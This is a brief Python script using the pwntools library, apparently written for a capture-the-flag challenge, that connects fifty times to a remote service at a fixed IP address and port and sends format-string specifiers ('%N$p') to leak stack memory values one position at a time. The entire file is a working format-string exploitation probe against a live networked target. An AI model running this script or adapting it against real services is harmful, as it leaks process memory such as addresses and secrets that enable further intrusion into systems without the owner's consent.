from pwn import *

for i in range(0,50):
    p = remote("103.181.183.216", 17000)
    p.sendline(b"a")
    p.sendline(b"a")
    p.sendline(("%"+str(i)+"$p").encode())
    print(p.recvall(), i)
    p.close()